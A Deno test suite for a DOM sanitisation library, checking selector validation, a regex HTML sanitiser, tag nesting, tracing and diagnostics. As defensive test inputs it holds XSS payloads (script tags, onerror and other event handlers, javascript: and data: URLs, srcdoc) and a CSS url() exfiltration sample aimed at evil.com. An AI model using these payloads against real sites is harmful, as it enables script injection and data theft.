// SPDX-License-Identifier: PMPL-1.0-or-later

/**
 * SafeDOMCore Tests - DOM safety and sanitisation layer
 *
 * Tests:
 * - ProvenSelector validation (valid, invalid, edge cases)
 * - ProvenHTML regex sanitiser (OWASP XSS Filter Evasion vectors)
 * - Stack-based tag nesting validation
 * - MountTracer recording and retrieval
 * - DOMPurify fallback behaviour in non-browser environment
 * - Safety diagnostics reporting
 */

import { assertEquals, assertStringIncludes } from "jsr:@std/assert";
import {
  ProvenSelector,
  ProvenHTML,
  MountTracer,
  safetyDiagnostics,
} from "../src/core/SafeDOMCore.res.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Reset MountTracer between tests that inspect trace entries. */
function resetTracer() {
  MountTracer.clear();
}

// =========================================================================
// 1. ProvenSelector validation
// =========================================================================

Deno.test("ProvenSelector - valid: #app", () => {
  const r = ProvenSelector.validate("#app");
  assertEquals(r.TAG, "Ok");
  assertEquals(r._0._0, "#app");
});

Deno.test("ProvenSelector - valid: .container", () => {
  const r = ProvenSelector.validate(".container");
  assertEquals(r.TAG, "Ok");
  assertEquals(r._0._0, ".container");
});

Deno.test("ProvenSelector - valid: div", () => {
  const r = ProvenSelector.validate("div");
  assertEquals(r.TAG, "Ok");
  assertEquals(r._0._0, "div");
});

Deno.test("ProvenSelector - valid: #my-element", () => {
  const r = ProvenSelector.validate("#my-element");
  assertEquals(r.TAG, "Ok");
  assertEquals(r._0._0, "#my-element");
});

Deno.test("ProvenSelector - valid: [data-id]", () => {
  const r = ProvenSelector.validate("[data-id]");
  assertEquals(r.TAG, "Ok");
  assertEquals(r._0._0, "[data-id]");
});

Deno.test("ProvenSelector - valid: div > span", () => {
  const r = ProvenSelector.validate("div > span");
  assertEquals(r.TAG, "Ok");
  assertEquals(r._0._0, "div > span");
});

Deno.test("ProvenSelector - valid: .a .b .c", () => {
  const r = ProvenSelector.validate(".a .b .c");
  assertEquals(r.TAG, "Ok");
  assertEquals(r._0._0, ".a .b .c");
});

Deno.test("ProvenSelector - invalid: empty string", () => {
  const r = ProvenSelector.validate("");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "empty");
});

Deno.test("ProvenSelector - invalid: whitespace-only", () => {
  const r = ProvenSelector.validate("   ");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "empty");
});

Deno.test("ProvenSelector - invalid: very long string (300+ chars)", () => {
  const longSelector = "#" + "a".repeat(300);
  const r = ProvenSelector.validate(longSelector);
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "maximum length");
});

Deno.test("ProvenSelector - invalid: contains <", () => {
  const r = ProvenSelector.validate("div<script>");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "invalid CSS characters");
});

Deno.test("ProvenSelector - invalid: contains {", () => {
  const r = ProvenSelector.validate("div{color:red}");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "invalid CSS characters");
});

Deno.test("ProvenSelector - invalid: contains $", () => {
  const r = ProvenSelector.validate("$element");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "invalid CSS characters");
});

Deno.test("ProvenSelector - edge: just a hash '#'", () => {
  // A lone '#' contains only valid CSS chars, so it passes regex.
  // The implementation treats it as valid since '#' is in the allowed set.
  const r = ProvenSelector.validate("#");
  assertEquals(r.TAG, "Ok");
});

Deno.test("ProvenSelector - edge: unicode characters", () => {
  const r = ProvenSelector.validate("div.ünïcödé");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "invalid CSS characters");
});

// =========================================================================
// 2. ProvenHTML regex sanitiser - OWASP XSS Filter Evasion vectors
// =========================================================================

// -- Basic script injection --

Deno.test("ProvenHTML regex - strips <script>alert(1)</script>", () => {
  const result = ProvenHTML.regexSanitise("<script>alert(1)</script>");
  assertEquals(result.includes("<script"), false);
  assertEquals(result.includes("alert(1)"), false);
});

Deno.test("ProvenHTML regex - strips script with attributes", () => {
  const html = '<script type="text/javascript">alert(1)</script>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<script"), false);
});

Deno.test("ProvenHTML regex - strips case variation <SCRIPT>", () => {
  const result = ProvenHTML.regexSanitise("<SCRIPT>alert(1)</SCRIPT>");
  assertEquals(result.includes("alert"), false);
});

Deno.test("ProvenHTML regex - strips mixed case <ScRiPt>", () => {
  const result = ProvenHTML.regexSanitise("<ScRiPt>alert(1)</ScRiPt>");
  assertEquals(result.includes("alert"), false);
});

Deno.test("ProvenHTML regex - strips <sCrIpT>", () => {
  const result = ProvenHTML.regexSanitise("<sCrIpT>alert(1)</sCrIpT>");
  assertEquals(result.includes("alert"), false);
});

// -- IMG vectors --

Deno.test("ProvenHTML regex - strips IMG onerror", () => {
  const html = '<img src=x onerror=alert(1)>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("onerror"), false);
});

Deno.test("ProvenHTML regex - strips IMG with javascript: URL", () => {
  const html = '<img src="javascript:alert(1)">';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("javascript:"), false);
});

// -- Iframe --

Deno.test("ProvenHTML regex - strips <iframe>", () => {
  const html = '<iframe src="evil.html"></iframe>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<iframe"), false);
});

// -- Object tag --

Deno.test("ProvenHTML regex - strips <object>", () => {
  const html = '<object data="evil.swf"></object>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<object"), false);
});

// -- Embed tag --

Deno.test("ProvenHTML regex - strips <embed>", () => {
  const html = '<embed src="evil.swf">';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<embed"), false);
});

// -- Form tag --

Deno.test("ProvenHTML regex - strips <form>", () => {
  const html = '<form action="evil.php"><input type="submit"></form>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<form"), false);
});

// -- Base tag --

Deno.test("ProvenHTML regex - strips <base>", () => {
  const html = '<base href="evil.com">';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<base"), false);
});

// -- Meta refresh --

Deno.test("ProvenHTML regex - strips <meta http-equiv=refresh>", () => {
  const html = '<meta http-equiv="refresh" content="0;url=evil.com">';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<meta"), false);
});

// -- Link tag --

Deno.test("ProvenHTML regex - strips <link>", () => {
  const html = '<link rel="stylesheet" href="evil.css">';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<link"), false);
});

// -- SVG onload --

Deno.test("ProvenHTML regex - strips <svg> paired tags", () => {
  const html = "<svg onload=alert(1)></svg>";
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<svg"), false);
});

Deno.test("ProvenHTML regex - strips onload from unclosed <svg>", () => {
  // Unclosed <svg> tag: the paired-tag regex won't match, but the
  // on-event handler regex should strip the onload attribute.
  const html = "<svg onload=alert(1)>";
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("onload"), false);
});

// -- Math tag --

Deno.test("ProvenHTML regex - strips <math>", () => {
  const html = "<math><mi>evil</mi></math>";
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<math"), false);
});

// -- Template tag --

Deno.test("ProvenHTML regex - strips <template>", () => {
  const html = "<template><script>alert(1)</script></template>";
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<template"), false);
});

// -- Event handlers --

Deno.test("ProvenHTML regex - strips onclick handler", () => {
  const html = '<div onclick="alert(1)">click</div>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("onclick"), false);
});

Deno.test("ProvenHTML regex - strips onmouseover handler", () => {
  const html = '<div onmouseover="alert(1)">hover</div>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("onmouseover"), false);
});

Deno.test("ProvenHTML regex - strips onfocus handler", () => {
  const html = '<input onfocus="alert(1)">';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("onfocus"), false);
});

Deno.test("ProvenHTML regex - strips onblur handler", () => {
  const html = '<input onblur="alert(1)">';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("onblur"), false);
});

Deno.test("ProvenHTML regex - strips onsubmit handler", () => {
  const html = '<form onsubmit="alert(1)"></form>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("onsubmit"), false);
});

Deno.test("ProvenHTML regex - strips onchange handler", () => {
  const html = '<select onchange="alert(1)"></select>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("onchange"), false);
});

Deno.test("ProvenHTML regex - strips oninput handler", () => {
  const html = '<input oninput="alert(1)">';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("oninput"), false);
});

// -- javascript: URL variations --

Deno.test("ProvenHTML regex - blocks javascript: protocol", () => {
  const html = '<a href="javascript:alert(1)">link</a>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("javascript:"), false);
});

Deno.test("ProvenHTML regex - blocks mixed case jAvAsCrIpT:", () => {
  const html = '<a href="jAvAsCrIpT:alert(1)">link</a>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.toLowerCase().includes("javascript:"), false);
});

Deno.test("ProvenHTML regex - blocks javascript with leading space", () => {
  const result = ProvenHTML.regexSanitise(" javascript:alert(1)");
  assertEquals(result.includes("javascript:"), false);
});

// -- vbscript: --

Deno.test("ProvenHTML regex - blocks vbscript: protocol", () => {
  const html = '<a href="vbscript:alert(1)">link</a>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("vbscript:"), false);
});

// -- data: URL --

Deno.test("ProvenHTML regex - strips data: URL in href", () => {
  const html = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("data:text/html"), false);
});

// -- CSS exfiltration --

Deno.test("ProvenHTML regex - strips style with url()", () => {
  const html = '<div style="background:url(evil.com/steal?data=secret)">x</div>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("url("), false);
});

// -- formaction --

Deno.test("ProvenHTML regex - strips formaction attribute", () => {
  const html = '<button formaction="evil.php">Click</button>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("formaction"), false);
});

// -- xlink:href --

Deno.test("ProvenHTML regex - strips xlink:href attribute", () => {
  const html = '<a xlink:href="evil.com">link</a>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("xlink:href"), false);
});

// -- srcdoc --

Deno.test("ProvenHTML regex - strips srcdoc attribute", () => {
  const html = '<iframe srcdoc="<script>alert(1)</script>"></iframe>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("srcdoc"), false);
});

// -- Whitespace tricks --

Deno.test("ProvenHTML regex - strips script with space in opening tag", () => {
  // <script > has space before >, matched by [^>]*>
  const html = "<script >alert(1)</script>";
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("alert"), false);
});

Deno.test("ProvenHTML regex - strips script with tab in tag", () => {
  const html = "<script\t>alert(1)</script>";
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("alert"), false);
});

// -- Nested scripts --

Deno.test("ProvenHTML regex - strips nested scripts", () => {
  const html = "<script><script>alert(1)</script></script>";
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result.includes("<script"), false);
  assertEquals(result.includes("alert"), false);
});

// -- Clean HTML passes through --

Deno.test("ProvenHTML regex - clean HTML passes through unchanged", () => {
  const html = '<div class="container"><p>Hello <strong>world</strong></p></div>';
  const result = ProvenHTML.regexSanitise(html);
  assertEquals(result, html);
});

// =========================================================================
// 3. Stack-based tag nesting
// =========================================================================

Deno.test("Tag nesting - valid: <div><p>text</p></div>", () => {
  const r = ProvenHTML.checkTagNesting("<div><p>text</p></div>");
  assertEquals(r.TAG, "Ok");
});

Deno.test("Tag nesting - valid: nested spans", () => {
  const r = ProvenHTML.checkTagNesting("<div><span></span><span></span></div>");
  assertEquals(r.TAG, "Ok");
});

Deno.test("Tag nesting - valid: empty string", () => {
  const r = ProvenHTML.checkTagNesting("");
  assertEquals(r.TAG, "Ok");
});

Deno.test("Tag nesting - valid: self-closing <br/><hr/>", () => {
  const r = ProvenHTML.checkTagNesting("<br/><hr/>");
  assertEquals(r.TAG, "Ok");
});

Deno.test("Tag nesting - valid: void elements mixed with content", () => {
  const r = ProvenHTML.checkTagNesting("<p>text<br>more</p>");
  assertEquals(r.TAG, "Ok");
});

Deno.test("Tag nesting - valid: deeply nested", () => {
  const r = ProvenHTML.checkTagNesting("<div><ul><li><a>link</a></li></ul></div>");
  assertEquals(r.TAG, "Ok");
});

Deno.test("Tag nesting - valid: plain text only", () => {
  const r = ProvenHTML.checkTagNesting("Hello world");
  assertEquals(r.TAG, "Ok");
});

Deno.test("Tag nesting - invalid: misnested <b><i></b></i>", () => {
  const r = ProvenHTML.checkTagNesting("<b><i></b></i>");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "Misnested");
});

Deno.test("Tag nesting - invalid: unclosed <div><p>text</p>", () => {
  const r = ProvenHTML.checkTagNesting("<div><p>text</p>");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "Unclosed");
});

Deno.test("Tag nesting - invalid: unexpected </div>", () => {
  const r = ProvenHTML.checkTagNesting("</div>");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "Unexpected");
});

Deno.test("Tag nesting - invalid: deep misnesting", () => {
  const r = ProvenHTML.checkTagNesting("<div><span><em></span></em></div>");
  assertEquals(r.TAG, "Error");
  assertStringIncludes(r._0, "Misnested");
});

// =========================================================================
// 4. MountTracer
// =========================================================================

Deno.test("MountTracer - record and retrieve entries", () => {
  resetTracer();
  MountTracer.record("test-event", "detail-one");
  MountTracer.record("test-event", "detail-two");
  const all = MountTracer.entries();
  assertEquals(all.length, 2);
  assertEquals(all[0].event, "test-event");
  assertEquals(all[0].detail, "detail-one");
  assertEquals(all[1].detail, "detail-two");
  resetTracer();
});

Deno.test("MountTracer - latest returns most recent", () => {
  resetTracer();
  MountTracer.record("first", "a");
  MountTracer.record("second", "b");
  MountTracer.record("third", "c");
  const last = MountTracer.latest();
  assertEquals(last.event, "third");
  assertEquals(last.detail, "c");
  resetTracer();
});

Deno.test("MountTracer - clear empties the log", () => {
  resetTracer();
  MountTracer.record("x", "y");
  MountTracer.record("x", "z");
  assertEquals(MountTracer.count() >= 2, true);
  MountTracer.clear();
  assertEquals(MountTracer.count(), 0);
  assertEquals(MountTracer.entries().length, 0);
});

Deno.test("MountTracer - monotonic timestamps", () => {
  resetTracer();
  MountTracer.record("t1", "a");
  MountTracer.record("t2", "b");
  MountTracer.record("t3", "c");
  const all = MountTracer.entries();
  for (let i = 1; i < all.length; i++) {
    assertEquals(all[i].timestampMs >= all[i - 1].timestampMs, true);
  }
  resetTracer();
});

Deno.test("MountTracer - filterByPrefix works", () => {
  resetTracer();
  MountTracer.record("mount-attempt", "sel=#app");
  MountTracer.record("html-validation", "ok");
  MountTracer.record("mount-success", "sel=#app");
  MountTracer.record("html-validation", "ok2");
  const mountEntries = MountTracer.filterByPrefix("mount");
  assertEquals(mountEntries.length, 2);
  const htmlEntries = MountTracer.filterByPrefix("html");
  assertEquals(htmlEntries.length, 2);
  resetTracer();
});

Deno.test("MountTracer - latest returns undefined when empty", () => {
  resetTracer();
  const last = MountTracer.latest();
  assertEquals(last, undefined);
});

// =========================================================================
// 5. DOMPurify fallback
// =========================================================================

Deno.test("DOMPurify - isAvailable returns false in Deno", () => {
  // In Deno there is no globalThis.DOMPurify, so isAvailable should be false
  const diag = safetyDiagnostics();
  assertEquals(diag.dompurifyAvailable, false);
});

Deno.test("DOMPurify - sanitise uses RegexFallback in Deno", () => {
  // When DOMPurify is absent, sanitise() should use regex fallback
  const [_sanitised, method] = ProvenHTML.sanitise("<p>hello</p>");
  assertEquals(method, "RegexFallback");
});

Deno.test("DOMPurify - regex fallback strips dangerous content", () => {
  // Even without DOMPurify, the regex fallback should catch XSS vectors
  const [sanitised, method] = ProvenHTML.sanitise("<script>alert(1)</script><p>safe</p>");
  assertEquals(method, "RegexFallback");
  assertEquals(sanitised.includes("<script"), false);
  assertStringIncludes(sanitised, "<p>safe</p>");
});

// =========================================================================
// 6. Safety diagnostics
// =========================================================================

Deno.test("safetyDiagnostics - reports correct layer status", () => {
  const diag = safetyDiagnostics();
  // In Deno (no browser): DOMPurify unavailable, Trusted Types unsupported
  assertEquals(diag.dompurifyAvailable, false);
  assertEquals(diag.trustedTypesSupported, false);
  assertEquals(diag.trustedTypesPolicyActive, false);
  // Regex sanitiser and stack nesting are always active
  assertEquals(diag.regexSanitiserActive, true);
  assertEquals(diag.stackBasedNesting, true);
  // Trace entry count is a non-negative number
  assertEquals(typeof diag.traceEntryCount, "number");
  assertEquals(diag.traceEntryCount >= 0, true);
});

Deno.test("safetyDiagnostics - regexSanitiserActive and stackBasedNesting always true", () => {
  const diag = safetyDiagnostics();
  assertEquals(diag.regexSanitiserActive, true);
  assertEquals(diag.stackBasedNesting, true);
});
